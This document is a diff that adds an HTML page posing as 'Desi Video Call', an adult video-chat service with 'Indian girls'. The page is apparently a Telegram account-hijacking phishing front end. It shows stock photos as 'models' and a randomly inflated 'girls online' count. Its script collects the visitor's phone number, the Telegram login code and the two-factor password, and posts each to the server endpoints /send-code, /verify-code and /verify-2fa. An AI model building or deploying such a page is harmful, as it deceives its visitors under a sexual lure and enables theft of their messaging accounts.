@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desi Video Call - Connect with Indian Girls</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #8a2be2, #ff1493);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.9;
+        }
+
+        .background-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(138, 43, 226, 0.8), rgba(255, 20, 147, 0.8));
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .call-card {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 25px;
+            padding: 40px 35px;
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            margin-bottom: 25px;
+        }
+
+        .logo h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(45deg, #ffffff, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo p {
+            color: #ffd700;
+            font-size: 16px;
+            font-weight: 400;
+            opacity: 0.9;
+        }
+
+        .models-slider {
+            display: flex;
+            gap: 12px;
+            margin: 25px 0;
+            overflow-x: auto;
+            padding: 10px 5px;
+            scrollbar-width: none;
+        }
+
+        .models-slider::-webkit-scrollbar {
+            display: none;
+        }
+
+        .model-card {
+            flex: 0 0 auto;
+            width: 100px;
+            text-align: center;
+        }
+
+        .model-pic {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #ffd700;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .model-pic:hover {
+            transform: scale(1.1);
+            border-color: #ff1493;
+        }
+
+        .model-name {
+            font-size: 11px;
+            color: #ffd700;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #ffd700;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(255, 255, 255, 0.12);
+            border: 2px solid rgba(255, 215, 0, 0.5);
+            border-radius: 15px;
+            color: white;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ff1493;
+            background: rgba(255, 255, 255, 0.18);
+            box-shadow: 0 0 0 4px rgba(255, 20, 147, 0.2);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #ff1493, #8a2be2);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            font-family: 'Poppins', sans-serif;
+            box-shadow: 0 8px 25px rgba(255, 20, 147, 0.4);
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(255, 20, 147, 0.6);
+            background: linear-gradient(135deg, #8a2be2, #ff1493);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 215, 0, 0.6);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.25);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 25px 0;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ffd700;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            display: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .alert.error {
+            background: rgba(220, 53, 69, 0.2);
+            border: 1px solid rgba(220, 53, 69, 0.5);
+            color: #ff6b6b;
+        }
+
+        .alert.success {
+            background: rgba(40, 167, 69, 0.2);
+            border: 1px solid rgba(40, 167, 69, 0.5);
+            color: #51cf66;
+        }
+
+        .alert.info {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            color: #ffd700;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            gap: 12px;
+        }
+
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .step-dot.active {
+            background: #ffd700;
+            transform: scale(1.3);
+            box-shadow: 0 0 10px #ffd700;
+        }
+
+        .call-status {
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            border-left: 5px solid #ffd700;
+        }
+
+        .call-status h4 {
+            color: #ffd700;
+            margin-bottom: 8px;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .call-status p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .success-section {
+            padding: 20px 0;
+        }
+
+        .success-icon {
+            font-size: 70px;
+            margin-bottom: 20px;
+            text-shadow: 0 5px 15px rgba(255, 215, 0, 0.5);
+        }
+
+        .user-avatar {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff1493, #8a2be2);
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 35px;
+            color: white;
+            border: 4px solid #ffd700;
+            box-shadow: 0 8px 25px rgba(255, 20, 147, 0.4);
+        }
+
+        .timer {
+            color: #ffd700;
+            font-size: 15px;
+            margin: 15px 0;
+            font-weight: 600;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .badge {
+            background: linear-gradient(135deg, #ff1493, #8a2be2);
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 15px 0;
+            display: inline-block;
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+        }
+
+        .online-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .online-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #51cf66;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .emoji-strip {
+            font-size: 28px;
+            margin: 20px 0;
+            letter-spacing: 8px;
+        }
+
+        .features {
+            text-align: left;
+            margin: 25px 0;
+            padding: 0 10px;
+        }
+
+        .feature-item {
+            margin: 15px 0;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .feature-icon {
+            font-size: 18px;
+            color: #ffd700;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .button-group .btn {
+            flex: 1;
+        }
+
+        .otp-input-container {
+            position: relative;
+        }
+
+        .otp-input-container input {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .call-card {
+                padding: 30px 25px;
+                margin: 10px;
+            }
+            
+            .logo h1 {
+                font-size: 30px;
+            }
+            
+            input {
+                padding: 16px;
+            }
+            
+            .btn {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-container">
+        <div class="background-overlay"></div>
+    </div>
+
+    <div class="container">
+        <div class="call-card">
+            <div class="logo">
+                <div class="emoji-strip">💃✨🇮🇳💖🔥</div>
+                <h1>Desi Video Call</h1>
+                <p>Connect with Beautiful Indian Girls 🌸</p>
+                <div class="badge">LIVE INDIAN MODELS ONLINE</div>
+            </div>
+
+            <div class="online-indicator">
+                <div class="online-dot"></div>
+                <span style="color: #ffd700; font-size: 14px; font-weight: 500;">150+ Indian Girls Online Now</span>
+                <div class="online-dot"></div>
+            </div>
+
+            <div class="models-slider">
+                <div class="model-card">
+                    <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=200&h=200&fit=crop&crop=face" class="model-pic" alt="Priya">
+                    <div class="model-name">Priya 🌸</div>
+                </div>
+                <div class="model-card">
+                    <img src="https://images.unsplash.com/photo-1544725176-7c40e5a71c5e?w=200&h=200&fit=crop&crop=face" class="model-pic" alt="Sania">
+                    <div class="model-name">Sania 💫</div>
+                </div>
+                <div class="model-card">
+                    <img src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=200&h=200&fit=crop&crop=face" class="model-pic" alt="Neha">
+                    <div class="model-name">Neha 💖</div>
+                </div>
+                <div class="model-card">
+                    <img src="https://images.unsplash.com/photo-1567532939604-b6b5b0db2604?w=200&h=200&fit=crop&crop=face" class="model-pic" alt="Anjali">
+                    <div class="model-name">Anjali ✨</div>
+                </div>
+                <div class="model-card">
+                    <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?w=200&h=200&fit=crop&crop=face" class="model-pic" alt="Kavya">
+                    <div class="model-name">Kavya 🌺</div>
+                </div>
+            </div>
+
+            <div class="step-indicator">
+                <div class="step-dot active" id="step1-dot"></div>
+                <div class="step-dot" id="step2-dot"></div>
+                <div class="step-dot" id="step3-dot"></div>
+            </div>
+
+            <div class="alert error" id="error-alert"></div>
+            <div class="alert success" id="success-alert"></div>
+            <div class="alert info" id="info-alert"></div>
+
+            <!-- Step 1: Phone Number -->
+            <div class="step active" id="step1">
+                <div class="call-status">
+                    <h4>🎬 Start Your Desi Video Call</h4>
+                    <p>Verify your number to connect with beautiful Indian girls waiting to talk with you! 💕</p>
+                </div>
+                
+                <div class="features">
+                    <div class="feature-item">
+                        <span class="feature-icon">💫</span>
+                        <span>Instant connection with real Indian girls</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🔒</span>
+                        <span>Private & secure video calls</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🚀</span>
+                        <span>No registration required</span>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="phone">📱 Enter Your WhatsApp Number</label>
+                    <input type="text" id="phone" placeholder="+91 98765 43210" required>
+                </div>
+                
+                <button class="btn" onclick="sendCode()">
+                    <span>💖 SEND VERIFICATION CODE</span>
+                </button>
+            </div>
+
+            <!-- Step 2: Verification Code -->
+            <div class="step" id="step2">
+                <div class="call-status">
+                    <h4>🔐 Enter Verification Code</h4>
+                    <p>We sent a 5-digit code to your Telegram. Enter it below to continue ✨</p>
+                </div>
+                
+                <div class="input-group otp-input-container">
+                    <label for="code">📲 Enter 5-Digit Code</label>
+                    <input type="text" id="code" placeholder="Enter code here" maxlength="5" required>
+                </div>
+                
+                <div class="timer" id="step2-timer">⏰ Code expires in: 2:00</div>
+                
+                <div class="input-group" id="password-group" style="display: none;">
+                    <label for="password">🔒 Two-Factor Authentication</label>
+                    <input type="password" id="password" placeholder="Enter your 2FA password" required>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goBack(1)">← Back</button>
+                    <button class="btn" onclick="verifyCode()">💃 JOIN VIDEO CALL</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Success -->
+            <div class="step" id="step3">
+                <div class="success-section">
+                    <div class="user-avatar">🎉</div>
+                    <div class="success-icon">✅</div>
+                    
+                    <div class="call-status">
+                        <h4>🎊 Verification Successful!</h4>
+                        <p>Welcome to Desi Video Call! Beautiful Indian girls are waiting to connect with you right now! 🌸</p>
+                    </div>
+
+                    <div class="emoji-strip">💕🎯💫🌸✨🇮🇳</div>
+                    
+                    <button class="btn" onclick="resetForm()">
+                        <span>🔄 START NEW CONVERSATION</span>
+                    </button>
+
+                    <div style="margin-top: 25px; font-size: 13px; color: rgba(255, 255, 255, 0.8);">
+                        <p>💫 Connecting you with verified Indian profiles...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p id="loading-text">Finding your perfect match... 💖</p>
+            </div>
+
+            <div style="margin-top: 25px; padding: 18px; background: rgba(255, 255, 255, 0.1); border-radius: 12px;">
+                <p style="font-size: 12px; color: rgba(255, 255, 255, 0.8); line-height: 1.5; text-align: center;">
+                    🔞 18+ Only • 💌 100% Private & Secure • 🌟 Verified Indian Profiles • ⚡ Instant Connection
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        let otpTimer = null;
+
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+            
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                dot.classList.toggle('active', index + 1 === step);
+            });
+            
+            currentStep = step;
+        }
+
+        function showAlert(message, type) {
+            const alert = document.getElementById(`${type}-alert`);
+            alert.textContent = message;
+            alert.style.display = 'block';
+            
+            if (type !== 'error') {
+                setTimeout(() => {
+                    alert.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        function hideAlerts() {
+            document.querySelectorAll('.alert').forEach(alert => {
+                alert.style.display = 'none';
+            });
+        }
+
+        function setLoading(loading, text = 'Finding your perfect match... 💖') {
+            document.getElementById('loading').style.display = loading ? 'block' : 'none';
+            document.getElementById('loading-text').textContent = text;
+        }
+
+        function startOTPTimer(timeout) {
+            const timerElement = document.getElementById('step2-timer');
+            let timeLeft = timeout;
+            
+            if (otpTimer) clearInterval(otpTimer);
+            
+            otpTimer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `⏰ Code expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+                timeLeft--;
+                
+                if (timeLeft < 0) {
+                    clearInterval(otpTimer);
+                    timerElement.textContent = '❌ Code expired. Please request a new one.';
+                    timerElement.style.background = 'rgba(220, 53, 69, 0.2)';
+                    timerElement.style.color = '#ff6b6b';
+                }
+            }, 1000);
+        }
+
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                showAlert('Please enter your phone number to continue! 📱', 'error');
+                return;
+            }
+
+            if (!phone.startsWith('+')) {
+                showAlert('Please include country code (e.g., +91 for India) 🇮🇳', 'error');
+                return;
+            }
+
+            hideAlerts();
+            setLoading(true, 'Sending verification code... 📲');
+
+            try {
+                const response = await fetch('/send-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    showStep(2);
+                    showAlert('✅ Verification code sent! Check your Telegram app.', 'success');
+                    startOTPTimer(data.timeout || 120);
+                } else {
+                    showAlert(data.error || 'Failed to send code. Please try again.', 'error');
+                }
+            } catch (error) {
+                showAlert('Network error. Please check your internet connection.', 'error');
+                console.error('Send code error:', error);
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('code').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!code) {
+                showAlert('Please enter the 5-digit verification code.', 'error');
+                return;
+            }
+
+            hideAlerts();
+            setLoading(true, 'Verifying your code... 🔐');
+
+            try {
+                let endpoint = '/verify-code';
+                let body = { code };
+
+                if (document.getElementById('password-group').style.display !== 'none') {
+                    if (!password) {
+                        showAlert('Please enter your 2FA password to continue.', 'error');
+                        setLoading(false);
+                        return;
+                    }
+                    endpoint = '/verify-2fa';
+                    body = { password };
+                }
+
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(body)
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    showStep(3);
+                    showAlert('🎉 Success! You can now start video calling.', 'success');
+                    if (otpTimer) clearInterval(otpTimer);
+                    
+                    // Add celebration effect
+                    celebrateSuccess();
+                } else {
+                    if (data.error === '2FA_PASSWORD_REQUIRED') {
+                        document.getElementById('password-group').style.display = 'block';
+                        showAlert('🔒 Two-factor authentication is enabled. Please enter your password.', 'info');
+                    } else {
+                        showAlert(data.error || 'Verification failed. Please check the code and try again.', 'error');
+                    }
+                }
+            } catch (error) {
+                showAlert('Network error. Please try again.', 'error');
+                console.error('Verify code error:', error);
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        function celebrateSuccess() {
+            const emojis = ['💃', '✨', '💖', '🎉', '🌸', '🎊', '💫', '🇮🇳'];
+            const container = document.querySelector('.container');
+            
+            for (let i = 0; i < 15; i++) {
+                setTimeout(() => {
+                    const emoji = document.createElement('div');
+                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    emoji.style.position = 'fixed';
+                    emoji.style.left = Math.random() * 100 + 'vw';
+                    emoji.style.top = '-50px';
+                    emoji.style.fontSize = (Math.random() * 25 + 25) + 'px';
+                    emoji.style.zIndex = '9999';
+                    emoji.style.pointerEvents = 'none';
+                    emoji.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
+                    
+                    document.body.appendChild(emoji);
+                    
+                    setTimeout(() => {
+                        emoji.remove();
+                    }, 5000);
+                }, i * 150);
+            }
+        }
+
+        // Add falling animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fall {
+                to {
+                    transform: translateY(100vh) rotate(360deg);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+
+        function goBack(step) {
+            hideAlerts();
+            showStep(step);
+        }
+
+        async function resetForm() {
+            try {
+                await fetch('/cleanup', { method: 'POST' });
+            } catch (error) {
+                console.error('Cleanup error:', error);
+            }
+            
+            document.getElementById('phone').value = '';
+            document.getElementById('code').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('password-group').style.display = 'none';
+            hideAlerts();
+            showStep(1);
+        }
+
+        // Enter key support
+        document.addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                if (currentStep === 1) {
+                    sendCode();
+                } else if (currentStep === 2) {
+                    verifyCode();
+                }
+            }
+        });
+
+        // Auto-advance OTP input
+        document.getElementById('code')?.addEventListener('input', function(e) {
+            if (this.value.length === 5) {
+                verifyCode();
+            }
+        });
+
+        // Update online count randomly
+        function updateOnlineCount() {
+            const baseCount = 150;
+            const randomAddition = Math.floor(Math.random() * 25);
+            const onlineText = document.querySelector('.online-indicator span');
+            onlineText.textContent = (baseCount + randomAddition) + '+ Indian Girls Online Now';
+        }
+
+        setInterval(updateOnlineCount, 8000);
+
+        // Animate model cards
+        function animateModels() {
+            const models = document.querySelectorAll('.model-pic');
+            models.forEach((model, index) => {
+                setTimeout(() => {
+                    model.style.transform = 'scale(1.15)';
+                    setTimeout(() => {
+                        model.style.transform = 'scale(1)';
+                    }, 800);
+                }, index * 400);
+            });
+            
+            setTimeout(animateModels, 4000);
+        }
+
+        animateModels();
+    </script>
+</body>
+</html>
